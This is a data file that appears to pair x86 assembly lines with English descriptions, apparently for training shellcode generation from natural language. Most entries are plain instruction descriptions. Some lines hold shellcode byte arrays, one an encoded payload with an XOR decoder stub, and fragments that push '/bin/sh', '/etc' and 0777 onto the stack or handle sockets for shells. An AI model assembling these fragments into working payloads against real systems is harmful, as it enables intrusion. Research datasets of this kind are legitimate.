shellcode: db 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa	shellcode is array of bytes 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa
shellcode: db 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb	shellcode is an array of bytes 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb
shellcode: db 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a	define the array of bytes shellcode and initialize it to 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
shellcode: db 0xf1,0x31,0x90,0x38,0x47,0x47,0x5c,0x1b,0x1b,0x47,0x4d,0x0b,0x07,0xe7,0x6a,0xb3,0xd9,0x6b,0xb1,0xda,0x68,0x51,0xbb,0xc6,0x4d	define shellcode as array of the bytes 0xf1,0x31,0x90,0x38,0x47,0x47,0x5c,0x1b,0x1b,0x47,0x4d,0x0b,0x07,0xe7,0x6a,0xb3,0xd9,0x6b,0xb1,0xda,0x68,0x51,0xbb,0xc6,0x4d
shellcodelen equ $-shellcode	define shellcodelen equal to the length of shellcode
shellcodelen equ $-shellcode	define shellcodelen equal to the length shellcode
shift_decode:	declare the shift_decode label
shift_decode:	define shift_decode label
shift_decode:	define shift_decode routine
shl al, 4	left shift the contents of al by 4 bit positions
shl cx, 1	left shift cx
shl eax, 1	multiply eax by 2 using left shift
shl eax, 1	multiply the value of eax by 2
shl eax, 16	left shift the contents of eax 16 bits
shl eax, 2	multiply eax by 4 using left shift
shl eax, 28	left shift the contents of eax register by 28 bit positions
shl eax, 28	shift left 28 bits of eax
shl eax, 28	shift left the eax register by 28 bits
shl eax, 5	left shift the contents of eax by 5 bit positions
shl eax,2	left shift eax by two bits
shl ebx, 1	multiply ebx by 2 using left shift
shl ebx, 2	multiply ebx by 4 using left shift
shl ebx, 8	left shift the contents of ebx by 8 bits
shl ecx, 1	multiply ecx by 2 using left shift
shl ecx, 2	multiply ecx by 4 using left shift
shl edi, 0x1	left shift the contents of the edi register by 0x1 bit
shl edi,0x1	shift left edi register bits 1 time with zeroes shifted in on right
shl edx, 1	multiply edx by 2 using left shift
shl edx, 2	multiply edx by 4 using left shift
shl edx, 24	shift left edx register bits 24 time with zeroes shifted in on right
shl edx, 24	left shift the contents of the edx register by 24 bits
shl edx, 9	left shift the contents of edx register by 9 bit positions
shl edx, 9	left shift the contents of the edx register by 9 bits
shl esi, 0x1	left shift the contents of the esi register by 0x1 bit
shl esi,0x1	shift left esi register bits 1 time with zeroes shifted in on right
shr [var], 3	right shift by 3 bit positions the contents of var variable
shr ax, 1	shift encoded_shellcode to right by one bit, one word at a time
shr ax, 1	right shift ax by 1 bit
shr ax, 1	shift the ax register to right by one bit
shr ax, bl \n not word ax	shift right ax by the contents of bl and negate the word in ax
shr ax, cl	moves the bits of ax to the right by a number equal to the content of cl
shr ax, cl	right shift the contents of the edi register by the contents of the cl register
shr ax, cl \n not word ax	shift right ax by the contents of cl and negate the word in ax
shr bl, 4	right shift the contents of bl register by 4 bit positions
shr bl, 4	right shift the contents of bl by 4
shr bl,4	right shift by 4 bits bl
shr bx, cl \n not bx	shift right bx by the contents of cl and negate the contents of bx
shr bx, dl \n not byte bl	shift right bx by the contents of dl and negate the byte in bx
shr cx, al \n not cx	shift right cx by the contents of al and negate the contents of cx
shr dl, 1	right shift the contents of the dl register by 1 bit
shr dl, 1	right shift the contents of dl register by 1 bit positions
shr dl, 1	shift right dl by 1
shr dl, 4	right shift the contents of dl register by 4 bit positions
shr dl, 4	shift right the dl register by 4 bits
shr dx, bl \n not byte dx	shift right dx by the contents of bl and negate the byte in dx
shr eax, 0x10	shift right all bits of eax 0x10 times
shr eax, 0x8	shift right all bits of eax 0x8 times
shr eax, 1	divide eax by 2 using right shift
shr eax, 16	right shift the contents of eax register by 16 bit positions
shr eax, 2	divide eax by 4 using right shift
shr eax, 24	right shift the contents of the eax register by 24 bit positions
shr eax, 24	shift right 24 of eax
shr eax, 28	right shift the contents of eax register by 28 bit positions
shr eax, 28	shift right 28 of eax
shr ebx, 0x8	shift right all bits of ecx 0x8 times
shr ebx, 1	divide ebx by 2 using right shift
shr ebx, 2	divide ebx by 4 using right shift
shr ebx, cl	right shift the contents of the ebx register by the contents of the cl register
shr ecx, 0x10	shift right all bits of ecx 0x10 times
shr ecx, 1	divide ecx by 2 using right shift
shr ecx, 2	divide ecx by 4 using right shift
shr edx, 1	divide edx by 2 using right shift
shr edx, 16	right shift the contents of the edx register by 16
shr edx, 16 \n inc edx	do the logical shift to the right of the edx bits for 16 times the increase them of 1
shr edx, 2	divide edx by 4 using right shift
shr edx, byte 16	right shift the contents of the edx register by the byte 16
shr edx, byte 24	right shift the contents of the edx register by the byte 24
size: equ 1024	define size to be 1024 bytes large
size: equ 50000	declare a constant size and set equal to 50000
stage:	declare _stage label
stage:	define _ stage label
stage:	declare the stage label
stage:	define stage label
stage: \n call decoder	define stage and call decoder function
stageaddress:	define _stageaddress label
stageaddress:	declare the stageaddress label
start:	declare the start label
stc	set carry flag
stos byte ptr es:[edi],al	stores al register content to location at edi
str db 'hello',0	declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte
str db 'hey',0	declare 4 bytes starting at the address str initialized to the ascii character values for the string 'hey' and 0 respectively
string db 'test.txt'	define string as the byte string 'test.txt'
string: db '/bin/sh'	define string as the byte string '/bin/sh'
string: db '/etc/passwd'	define string as the byte string '/etc/passwd'
string: db 'file.txt'	define string as the byte string 'file.txt'
string: db 'file1.txt'	define string as the byte string 'file1.txt'
string: db 'prova.txt'	define string as the byte string 'prova.txt'
string: db 'tmp.txt'	define string as the byte string 'tmp.txt'
sub [var], esi	subtract the contents of esi from the 32-bit integer stored at memory location var
sub [var2], esi	subtract the contents of esi from the 32-bit integer stored at memory location var2
sub al, 0x13	subtract 0x13 from the al register
sub al, 0x41	subtract 0x41 from the al register
sub al, 1 \n jns l1	subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not negative
sub al, 1 \n jnz l1	subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero
sub al, 88	subtract 88 from the contents of al register and save the result in al
sub al, 88	subtract 88 from the contents of the al register
sub al, ah	subtract ah from al
sub al,0x54	subtract hexadecimal value 0x54 to al register
sub ax, 13	substract 13 from encoded_shellcode, one word at a time
sub ax, 13	subtract 13 from ax and save the result into ax
sub ax, 13	subtract 13 from the ax register
sub ax, 1564	subtract 1564 from ax and save the result into ax
sub ax, 1564	subtract 1564 from the contents of ax register and save the result in ax
sub ax, 1564	subtract 1564 from the contents of the ax register
sub ax, 1662	subtract 1662 from ax and save the result into ax
sub ax, 1662	subtract 1662 from the contents of ax register and save the result in ax
sub ax, 1662	subtract the contents of the ax register by 1662
sub ax, ax	subtract the contents of ax from the contents of ax
sub bl, 0x7	subtract 0x7 to bl
sub bl, 0x7	subtract 0x7 from bl and save the result into bl
sub bl, 0x7	subtract 0x7 from the contents in bl and save the result in bl
sub bl, 3	subtract 3 from the contents of the bl register
sub bl, 3 \n jnz stage	subtract the value 3 from the contents of the bl register and jump to the stage label if the result is not zero
sub bl, 4 \n jns l2	subtract the value 4 from the contents of the bl register and jump to the l2 label if the result is not negative
sub bl, 48	subtract the decimal value 48 from the nl register
sub bl, al	subtract the contents of al register from the contents of bl register and save the result in bl
sub bl, al	subtract the contents of al from the bl register
sub bl, byte [esi]	subtract 0x7 from the byte in esi register
sub bl, byte [esi]	subtract the current byte of the shellcode from bl
sub bl, cl \n jnz l2	subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero
sub bl,3 \n jnz stage	subtract 3 from bl register and go to _stage label if flag zero is not set
sub bl,byte [esi]	subtract the byte in esi from the bl register
sub bx, 1634	subtract 1634 from bx and save the result into bx
sub bx, 1634	subtract 1634 from the contents of bx register and save the result in bx
sub bx, 1634	subtract 1634 from the contents of the bx register
sub bx, 1663	subtract 1663 from bx and save the result into bx
sub bx, 1663	subtract 1663 from the contents of the bx register
sub bx, 1663	subtract the contents of bx register by 1663 and save the result in bx
sub bx, bx	subtract the contents of bx from the contents of bx
sub bx, dx	subtract dx = 13 to bx = 256
sub bx, dx	subtract the contents of the dx register from the contents of the bx register
sub byte [buff],20h	subtract 20h from the 8-bit at memory location buff
sub byte [ebp+ecx],20h	subtract 20h from the 8-bit at memory location ebp+ecx
sub byte [edi], 0x4 \n not byte [edi]	subtract 0x4 from the byte at the address edi and negate the result
sub byte [edi], 7 \n not byte [edi]	negate the byte at the address edi after subtracting the value 7
sub byte [edi], 8 \n not byte [edi]	subtract the value 8 from the byte in edi and negate it
sub byte [esi], 0x1 \n not byte [esi]	subtract 0x1 from the current byte of the shellcode and negate the result
sub byte [esi], 0x1 \n not byte [esi]	subtract 0x1 from the byte at the address esi and negate the result
sub byte [esi], 0x9 \n not byte [esi]	subtract the value 0x9 from the current byte of the shellcode and then negate the result
sub byte [esi], 0xd	subtract 13 to esi content
sub byte [esi], 0xd	subtract 0xd from the byte at the address esi
sub byte [esi], 13	undo rot13
sub byte [esi], 13	subtract 13 from the byte at the address esi
sub byte [esi], 13	subtract 13 from the byte in esi and save the result in esi
sub byte [esi], 2 \n not byte [esi]	negate the byte at the address esi after subtracting the value 2
sub byte [esi], 3 \n not byte [esi]	subtract the value 3 from the byte in esi and negate it
sub byte [esi], 8	subtract the decimal value 8 from the byte esi in memory
sub byte [esi], 8 \n not byte [esi]	subtract 8 from the byte in esi and then negate the result
sub cl, 1	dec count by 1
sub cl, 1	subtract 1 from the contents of the cl register
sub cl, 1 \n jnz decode	subtract the value 1 from the contents of the cl register and jump to the decode label if the result is not zero
sub cl, bl \n jns l3	subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative
sub cl, dl	subtract the contents of dl register from the contents of cl register and save the result in cl
sub cl, dl	subtract the contents of dl from the cl register
sub cx, 0x7ff	subtract 0x7ff from the contents in cx and save the result in cx
sub cx, 0x7ff	subtract 0x7ff from the contents of cx register value and save the result in cx
sub cx, cx	subtract the contents of cx from the contents of cx
sub dl, 5 \n jns l4	subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative
sub dl, al	subtract the contents of al register from the contents of dl register and save the result in dl
sub dl, al \n jns decode_pr	subtract the contents of the al register from the contents of the dl register and jump to the decode_pr label if the result is not negative
sub dl, al \n jns decode_pr	subtract al from dl and jump to decode_pr if the sign flag is zero
sub dl, byte [esi]	subtract shellcode byte value to dl = 13
sub dl, byte [esi]	subtract the byte at the address esi from the contents of the dl register
sub dx, 15444	subtract 15444 from dx and save the result into dx
sub dx, 15444	subtract 15444 from the contents of the dx register
sub dx, bx	subtract the contents of bx from the contents of dx
sub dx, bx	subtract bx from dx
sub eax, [esp]	subtract the value of the memory at address esp from eax and store into eax
sub eax, 0x013ffeff	subtract 0x013ffeff from the contents in eax and save the result in eax
sub eax, 0x013ffeff \n push eax	push ‘ in/c’ on stack
sub eax, 0x04feca01	subtract 0x04feca01 from the contents in eax and save the result in eax
sub eax, 0x04feca01 \n inc eax \n push eax	push ‘/etc’ on stack
sub eax, 0x0efc3532	subtract 0x0efc3532 from the contents in eax and save the result in eax
sub eax, 0x0efc3532 \n push eax	push ‘//sh’ on stack
sub eax, 0x10	subtract 0x10 from eax
sub eax, 0x2c3d2dff	subtract 0x2c3d2dff from the contents in eax and save the result in eax
sub eax, 0x2c3d2dff \n push eax	push 0777 on stack
sub eax, 0x3217d6d2	subtract 0x3217d6d2 from the contents in eax and save the result in eax
sub eax, 0x3217d6d2 \n add eax, 0x31179798 \n push eax	push ‘///b’ on stack
sub eax, 0x3bd04ede	subtract 0x3bd04ede from the contents in eax and save the result in eax
sub eax, 0x70445eaf	subtract 0x70445eaf from the contents in eax and save the result in eax
sub eax, 216	subtract 216 from the value stored in eax
sub eax, 3	decrease eax by 3
sub eax, 3e716230	subtract 3e716230 from the contents of the eax register
sub eax, 5d455523	subtract 5d455523 from the contents of the eax register
sub eax, 5e5d7722	subtract 5e5d7722 from the contents of the eax register
sub eax, 8	subtract 8 from the contents of eax register and save the result in eax
sub eax, 8	subtract 8 from the contents of the eax register
sub eax, eax	zero out eax
sub eax, eax	subtract the contents of eax from the contents of eax
sub eax, ebx	subtract ebx from eax
sub eax, ebx	subtract the address in ebx from the address in eax
sub eax,20000h	subtract 20000h from eax register
sub ebx, 0x2e2aa163	subtract 0x2e2aa163 from ebx and save the result into ebx
sub ebx, 0x2e2aa163	subtract 0x2e2aa163 from the contents in ebx and save the result in ebx
sub ebx, 0x2e2aa163 \n push ebx	subtract the hexadecimal value 0x2e2aa163 to ebx content, then push it on stack
sub ebx, 2	decrease ebx by 2
sub ebx, byte 3	subtract the byte 3 from the contents of the ebx register
sub ebx, byte 3	subtract the byte value 3 from the contents of ebx and save the result in ebx
sub ebx, byte 8	subtract the byte 8 from the contents of the ebx register
sub ebx, byte 8	subtract the byte value 8 from the contents of ebx and save the result in ebx
sub ebx,ebx \n xor ecx,ecx	zero out ebx and ecx content
sub ecx, 0x03030303	subtract 3.3.3.3 from ip address
sub ecx, 0x04baca01	subtract 0x04baca01 from the contents in ecx and save the result in ecx
sub ecx, 0x04baca01 \n inc ecx \n push ecx	push ‘/etc’ on stack
sub ecx, 0x0b454440	subtract 0x0b454440 from the contents in ecx and save the result in ecx
sub ecx, 0x0b454440 \n push ecx	push ‘///h’ on stack
sub ecx, 0x1525152a	subtract 0x1525152a from the contents in ecx and save the result in ecx
sub ecx, 0x6374612e	subtract hexadecimal value 0x6374612e to ecx content
sub ecx, 0x6374612e	subtract 0x6374612e from the contents in ecx and save the result in ecx
sub ecx, 1	decrease ecx by 1
sub ecx, 23	move addr ptr back
sub ecx, 23	subtract 23 from the contents of the ecx register
sub ecx, ecx	zero out ecx
sub ecx, ecx	zero out the counter ecx register
sub ecx, ecx	subtract the contents of the ecx register from the contents of the ecx register
sub ecx, ecx	subtract the contents of ecx from the contents of ecx
sub ecx, ecx	subtract ecx from ecx and save the result into ecx
sub ecx,ecx	clear ecx
sub ecx,ecx \n push ecx	zero out ecx register and push its content on stack
sub ecx,ecx \n push ecx	clear ecx and push ints content on stack
sub edi, 0x44444444	subtract the hexadecimal value 0x44444444 from edi content
sub edi, 0x44444444	subtract 0x44444444 from edi and save the result in edi
sub edi, 0xffffffdf	subtract 0xffffffdf from edi
sub edi, 1768009314	subtract 1768009314 from the contents of the edi register
sub edi, 1768009314	subtract 1768009314 from the edi register and save the result in edi
sub edi,0x11111111	subtract hexadecimal value 0x11111111 to edi content
sub edx, 4	decrease edx by 4
sub edx, edx	clear edx
sub edx, edx	subtract the contents of the edx register from the contents of the edx register
sub edx, edx \n push edx	zero out edx and push it on stack
sub esp, 0x24	subtract 0x24 from the contents in esp and save the result in esp
sub esp, 0x28	subtract the value 0x28 from the esp register
sub esp, 0x7f	subtract 0x7f from the stack
sub esp, 0x7f	subtract 0x7f from esp
sub esp, 12	subtract 12 from esp register and save the result in esp
sub esp, 12	subtract 12 from the contents of the esp register
sub esp, 4	subtract 4 from the esp content
sub esp, 4	allocate memory for variable
sub esp, 4	make room for one 4-byte local variable
sub esp, 4	make room on the stack for local variable
sub esp, 4	allocate memory for local variables
sub esp, 4	subtract the value 4 from the esp register and save the result in esp
sub esp, 4	allocate space on the stack for local variable
sub esp, 4	make space on stack
sub esp, 4	allocate memory for a variable
sub esp, 8	subtract 8 value to esp content
sub esp, 8	subtract 8 from esp and save the result in esp
sub esp, byte 0x1	subtract the byte 0x1 from the contents of the esp register
sub esp, byte 0x1	subtract the byte value 0x1 from esp register and save the result in esp
sub esp,0x4 \n sub esp,0x4	esp points to the top of the stack
switch:	declare _switch label
switch:	define the switch function
sys_execve equ 0x0b	define sys_execve equal to 0x0b
syscall	make the syscall
syscall_execve equ 11	define syscall_execve = 11
syscall_execve equ 11	define syscall_execve equal to 11
test al, al	test the value of the al register
test al, al \n jz found \n inc ecx	jump to the label found if the contents of the al register is zero else increment the contents of the ecx register
test al, al \n jz found \n inc ecx	if the contents of the al register is zero then jump to the label found else increment the contents of the ecx register
test ax, ax	perform a bitwise and of the contents of ax and the contents of ax
test ax, ax \n jnz exeunt \n jmp carryon	jump to the label exeunt if the contents of the ax register is not zero else jump to the label carryon
test ax, ax \n jnz exeunt \n jmp carryon	if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon
test bl, bl \n jz not_found	jump to the label not_found if the contents of the bl register is not zero
test bl, bl \n jz not_found	if the contents of the bl register is not zero then jump to the label not_found
test cl, cl	test the value of cl
test dl, 0x1 \n jnz ready_to_proxy	jump to the label ready_to_proxy if the contents of the dl register is not zero
test dl, 0x1 \n jnz ready_to_proxy	if the contents of the dl register is not zero then jump to the label ready_to_proxy
test eax, eax	check if eax is zero
test eax, eax	perform a bitwise and on the contents of the eax register
test eax, eax	test the value of eax
test eax, eax \n jnz _convert	jump to the label _convert if the contents of the eax register is not zero
test eax, eax \n jnz _convert	if the contents of the eax register is not zero then jump to the label _convert
test eax, eax \n jnz _parent \n pop ecx	jump to the label _parent if the contents of the eax register is not zero else restore the top of the stack into the ecx register
test eax, eax \n jnz _parent \n pop ecx	if the contents of the eax register is not zero then jump to the label _parent else restore the top of the stack into the ecx register
test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6	jump to the label _recv_http_request if the contents of the eax register is not zero else subtract the value 0x6 from the contents of the ecx register
test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6	if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register
test eax, eax \n jnz checkforfile	jump to the label checkforfile if the contents of the eax register is not zero
test eax, eax \n jnz checkforfile	if the contents of the eax register is not zero then jump to the label checkforfile
test eax, eax \n jnz do_next_accept	jump to the label do_next_accept if the contents of the eax register is not zero
test eax, eax \n jnz do_next_accept	if the contents of the eax register is not zero then jump to the label do_next_accept
test eax, eax \n jnz exit_on_error	jump to the label exit_on_error if the contents of the eax register is not zero
test eax, eax \n jnz exit_on_error	if the contents of the eax register is not zero then jump to the label exit_on_error
test eax, eax \n jnz l1	jump to the label l1 if the contents of the eax register is not zero
test eax, eax \n jnz l1	if the contents of the eax register is not zero then jump to the label l1
test eax, eax \n jnz l1 \n call myfunct	jump to the label l1 if the contents of the eax register is not zero else call the function myfunct
test eax, eax \n jnz l1 \n call myfunct	if the contents of the eax register is not zero then jump to the label l1 else call the function myfunct
test eax, eax \n jnz l4 \n call search	jump to the label l4 if the contents of the eax register is not zero else call the function search
test eax, eax \n jnz l4 \n call search	if the contents of the eax register is not zero then jump to the label l4 else call the function search
test eax, eax \n jnz short _parent	jump short to the label _parent if the contents of the eax register is not zero
test eax, eax \n jnz short _parent	if the contents of the eax register is not zero then jump short to the label _parent
test eax, eax \n js _while_loop	jump to the label _while_loop if the contents of the eax register is negative
test eax, eax \n js _while_loop	if the contents of the eax register is negative then jump to the label _while_loop
test eax, eax \n js close	jump to the label close if the contents of the eax register is negative
test eax, eax \n js close	if the contents of the eax register is negative then jump to the label close
test eax, eax \n js old_dirent	jump to the label old_dirent if the contents of the eax register is negative
test eax, eax \n js old_dirent	if the contents of the eax register is negative then jump to the label old_dirent
test eax, eax \n js short socket	jump short to the label socket if the contents of the eax register is negative
test eax, eax \n js short socket	if the contents of the eax register is negative then jump short to the label socket
test eax, eax \n jz check_html	jump to the label check_html if the contents of the eax register is zero
test eax, eax \n jz check_html	if the contents of the eax register is zero then jump to the label check_html
test eax, eax \n jz check_html \n jmp while	jump to the label check_html if the contents of the eax register is zero else jump to the while label
test eax, eax \n jz check_html \n jmp while	if the contents of the eax register is zero then jump to the label check_html else jump to the while label
test eax, eax \n jz close	jump to the label close if the contents of the eax register is zero
test eax, eax \n jz close	if the contents of the eax register is zero then jump to the label close
test eax, eax \n jz close \n mov ebx, edx	jump to the label close if the contents of the eax register is zero else move the contents of the edx register into the ebx register
test eax, eax \n jz close \n mov ebx, edx	if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register
test eax, eax \n jz proc_name	jump to the label proc_name if the contents of the eax register is zero
test eax, eax \n jz proc_name	if the contents of the eax register is zero then jump to the label proc_name
test eax, eax \n jz ready_to_proxy	jump to the label ready_to_proxy if the contents of the eax register is zero
test eax, eax \n jz ready_to_proxy	if the contents of the eax register is zero then jump to the label ready_to_proxy
test eax, eax \n jz short loc_402B13	jump short to the memory location loc_402B13 if the contents of the eax register is zero
test eax, eax \n jz short loc_402B13	if the contents of the eax register is zero then jump short to the memory location loc_402B13
test eax, eax \n jz short loc_402C13	jump short to the memory location loc_402C13 if the contents of the eax register is zero
test eax, eax \n jz short loc_402C13	if the contents of the eax register is zero then jump short to the memory location loc_402C13
test eax, eax \n jz socket	jump to the label socket if the contents of the eax register is zero
test eax, eax \n jz socket	if the contents of the eax register is zero then jump to the label socket
test eax, eax \n jz socket \n xor eax, eax	jump to the label socket if the contents of the eax register is zero else zero out the contents of the eax register
test eax, eax \n jz socket \n xor eax, eax	if the contents of the eax register is zero then jump to the label socket else zero out the contents of the eax register
test eax, eax \n jz write \n xor eax, eax	jump to the label write if the contents of the eax register is zero, else zero out the contents of the eax register
test eax, eax \n jz write \n xor eax, eax	if the contents of the eax register is zero then jump to the label write else zero out the contents of the eax register
test ebx, ebx	test the contents of the ebx register
test ebx, ebx \n js short l1	jump short to the label l1 if the contents of the ebx register is negative
test ecx, ecx	test the contents of the ecx register
test edx, edx	test the contents of the edx register
test esi, 01h \n je even_number	jump to even_number is the contents in esi is even
test si, 01h	perform and operation between si and 01h
test si, 01h \n je even_number	perform si & 01h discarding the result but set the zero flag to 1 if the least significant but of si is 0, even set the zero flag to 0 if the and operation between the leas singificant bit of si and 01h is zero, while set the zero flag = 1 if the and operation result is 1. if the si == 0 go to even_number label ese go to odd_number label
three:	define _three label
three:	declare the three label
todo:	declare todo_label
todo:	declare the todo label
total_students equ 50	define constant total_students equal to 50
two:	define two_label
two:	define _two label
two:	define two label
two:	declare the two label
up:	declare the up label
var db 32	declare var byte variable and initialize it to 32
var db 64	declare a byte containing the value 64 at label the memory location var
var_a db 232	allocate one byte of memory for var_a variable and initialize it to 232
var_a: dd 0x0	create the doubleword variable var_a in memory and initialize it to zero
var_b db 'c'	allocate one byte of memory for var_b variable and initialize it to 'c'
var2 db ?	declare an uninitialized byte labeled var2
var2 db ?	declare an uninitialized byte referred to as location var2
variablename1: resb 1	reserve 1 byte for variableName1
variablename2: resw 1	reserve 1 word for variableName2
variablename3: resd 1	reserve 1 double word for variableName3
word_table dw 134, 345, 564, 123	declare the array of words word_table initialized to 134 345 564 and 123
word_value dw 300	define the word value word_value and initialize it to 300
word1 word 65535	define word1 unsigned word and initialize it to 65535
word2 sword –32768	define word2 signed word and initialize it to -32768
word3 word ?	define word3 uninitialized unsigned word
wordvar: resw 1	reserve a word for wordvar
wrap_around:	define _wrap_around label
wrap_around:	declare the wrap_around label
write_syscall equ 4	define weite_syscall =4
write_syscall equ 4	define write_syscall equal to 4
write:	delcare _write label
write:	define write_label
write:	define write label
write:	declare the write label
writestring:	define _writestring label
writestring:	define writestring function
writestring:	declare the writestring label
x dw ?	declare a word uninitialized value referred to as location x
x dw ?	declare an uninitialized word labeled x
xchg [ebp+16], ecx	swap the address [ebp+16] with the contents of the ecx register
xchg [ebp+16], ecx	swap the contents in ebp+16 and ecx
xchg byte [esi+1], al	swap al value with next byte value (esi+1)
xchg eax, ebx	exchange ebx with eax content
xchg eax, ebx	put socket descriptor in ebx and 0x5 in eax
xchg eax, ebx	exchange ebx with eax contents
xchg eax, ebx	exchange eax with ebx contents
xchg eax, ebx	swap the contents of eax and ebx
xchg eax, ebx	swap the contents of the eax register with the contents of the ebx register
xchg eax, ebx	exchange eax with ebx
xchg eax, ecx	exchange ecx with eax content
xchg eax, ecx	swap the contents of the eax register with the contents of the ecx register
xchg eax, edx	exchange edx with eax contents
xchg eax, edx	swap the contents of the eax register with the contents of the edx register
xchg eax, esi	save sockfd
xchg eax, esi	swap the contents of eax and esi
xchg eax, esi	swap the contents of the eax register with the contents of the esi register
xchg eax, esi \n int 0x80	execute close syscall
xchg ebx, eax	save the socket descriptor stored in eax in ebx
xchg ebx, eax	move the return value of socket from eax to ebx ready for the next syscalls
xchg ebx, eax	exchange the content of eax with ebx so now ebx holds the new sockfd that was accepted
xchg ebx, eax	exchange ebx with eax contents
xchg ebx, eax	save fd in ebx
xchg ebx, eax	transfer the descriptor for the accepted socket from eax into ebx
xchg ebx, eax	store sockfd from eax in ebx
xchg ebx, eax	swap the contents of the ebx register with the contents of the eax register
xchg ebx, eax	swap the values of ebx and eax
xchg ebx, eax	swap the values of ebx and eax registers
xchg ebx, eax	exchange the contents of the ebx register with the contents of the eax register
xchg ebx, ebx	execute no operation
xchg ebx, ecx	exchange ebx with ecx
xchg ebx, edx	exchange ebx with edx content
xchg ebx, edx	set ebx=2 and edx=sockfd
xchg ebx, edx	swap the contents of the ebx register with the contents of the edx register
xchg ebx, esp	swap the contents of the ebx register with the contents of the esp register
xchg ebx, esp	swap the values of ebx and esp registers
xchg ebx,eax	exchange eax content with ebx content
xchg ebx,eax	save client_sockfd exchanging eax content with ebx content
xchg ebx,eax	save clientfd from eax to ebx
xchg ebx,eax	exchange eax content with ebx content (save clientfd from eax to ebx)
xchg ebx,eax	exchange eax contet with ebx content
xchg ebx,esp	exchange esp content with ebx content
xchg ebx,esp	save stack pointer to ebx
xchg ecx, edx	exchange edx with ecx content
xchg ecx, edx	exchange ecx with edx
xchg ecx, edx	swap the contents of the ecx register with the contents of the edx register
xchg ecx,eax	exchange eax content with ecx content
xchg ecx,edx	exchange edx contents with ecx contents
xchg edi, eax	transfer file descriptor to edi
xchg edi, eax	swap the contents of the edi register with the contents of the eax register
xchg edi, eax	swap the values of edi and eax registers
xchg edi,eax	exchange eax content with edi content
xchg edi,eax	save the socket descriptor stored in eax in edi
xchg edx, eax	swap the values of edx and eax registers
xchg edx, eax	exchange edx with eax
xchg edx, ebx	swap the values of edx and ebx registers
xchg edx,eax	exchange eax with edx content
xchg edx,eax	exchange eax and edx content
xchg edx,eax	execute no operation
xchg esi, eax	save the socket descriptor stored in eax in esi
xchg esi, eax	load the socket file desriptor from eax into esi register
xchg esi, eax	save sock result from eax into esi
xchg esi, eax	saving sockfd
xchg esi, eax	swap the contents of the esi register with the contents of the eax register
xchg esi, eax	swap the values of esi and eax
xchg esi, eax \n int 0x80	execute exit syscall
xchg esi, ebx	swap the values of esi and ebx
xchg esi,eax	save the socket descriptor stored in eax in esi
xchg esi,eax	load host_sockfd stored in eax to esi
xchg esi,eax \n xor eax,eax	load the sockfd sotred in eax to esi register and then clean eax register
xchg esp, esi	swap the values of esp and esi registers
xchg esp,eax	exchange eax and esp content
xchg si, bx	swap the values si ebx and bx registers
xor [ebx], word __flag_byte	perform xor operation between ebx register and the word __flag_byte and save the result in ebx
xor [ecx + 116], bh	perform xor operation between the value stored at the location ecx+116 and bh
xor [ecx + 116], bh	perform a logical xor between the address specified by [ecx + 116] and the bh register and save the result in [ecx + 116]
